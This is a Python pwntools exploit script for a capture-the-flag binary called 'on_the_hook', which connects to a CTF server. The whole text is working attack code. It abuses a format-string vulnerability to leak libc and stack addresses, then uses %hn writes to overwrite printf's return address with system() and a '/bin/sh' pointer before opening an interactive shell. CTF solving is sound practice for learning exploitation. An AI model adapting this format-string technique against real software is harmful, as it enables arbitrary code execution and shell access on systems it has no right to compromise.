from pwn import *

debug = 0

if(debug):
	r = process("./on_the_hook")
	gdb.attach(r)
	libc_start_off = 0x1edf0 + 245
	sign = b'e5'
	malloc_off = 0x00086df0
	malloc_hook_off = 0x001eb728
	system_off = 0x0045830
	environ_off = 0x001ed808
	binsh_off = 0x192352
else:
	r = remote("ctf.k3rn3l4rmy.com", 2201)
	libc_start_off = 0x18540 + 247
	sign = b'37'
	malloc_off = 0x00070f00
	malloc_hook_off= 0x001b2768
	system_off = 0x0003ada0
	environ_off = 0x001b3dbc
	binsh_off = 0x15ba0b

r.recvuntil(b'echo:')

# leak libc addr
payload = b"%27$x"
r.sendline(payload)
stuff = r.recvuntil(sign)
#print(stuff)
libc_base = int(stuff, 16) - libc_start_off 
print("libc_base: " + hex(libc_base))

environ_addr = libc_base + environ_off
system_addr = libc_base + system_off
binsh_addr = libc_base + binsh_off
print("system: " + hex(system_addr))
print("binsh: " + hex(binsh_addr))



# leak stack addr 
payload = b'%8$s' + p32(environ_addr)
r.sendline(payload)
stuff = r.recvuntil(b'\xff')[-4:]
stack = int.from_bytes(stuff, 'little')
print("stack:" + hex(stack))

ret = stack - 0x120
agr = stack - 0x118


# overwrite return address of printf
sys0 = system_addr % 0x10000
sys1 = (system_addr // 0x10000) % 0x10000
bin0 = binsh_addr %0x10000
bin1 = (binsh_addr // 0x10000) % 0x10000

payload = p32(ret) + p32(ret + 2) + p32(agr) + p32(agr + 2)
payload += f'%{sys0-16}x'.encode("utf-8") + b'%7$hn'
#payload += f'%{0xf777}x'.encode("utf-8") + b'%7$hn'
payload += f'%{(0x10000 - sys0 + bin0)%0x10000}x'.encode("utf-8") + b'%9$hn'
payload += f'%{(0x10000 - bin0 + sys1)%0x10000}x'.encode("utf-8") + b'%8$hn'
payload += f'%{(0x10000 - sys1 + bin1)%0x10000}x'.encode("utf-8") + b'%10$hn'
print(b"payload: " + payload)
r.sendline(payload)


'''
# overwrite return address of printf
payload = f'%{1234}x'.encode("utf-8") + b'%16$n'
payload += f'%{1234}x'.encode("utf-8") + b'%17$n'
payload += b"a"*(36 - len(payload))
payload += p32(ret) + p32(agr)
r.sendline(payload)
'''


r.interactive()
